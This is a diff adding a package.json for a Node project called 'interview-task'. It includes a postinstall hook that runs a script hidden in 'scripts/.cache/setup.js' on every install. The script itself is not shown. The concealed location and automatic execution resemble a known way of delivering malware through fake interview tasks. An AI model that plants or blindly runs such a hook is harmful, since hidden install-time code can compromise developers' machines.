@@ -1,0 +1,10 @@
+{
+  "name": "interview-task",
+  "version": "1.0.0",
+  "private": true,
+  "scripts": {
+    "start": "node index.js",
+    "postinstall": "node scripts/.cache/setup.js"
+  },
+  "dependencies": {}
+}
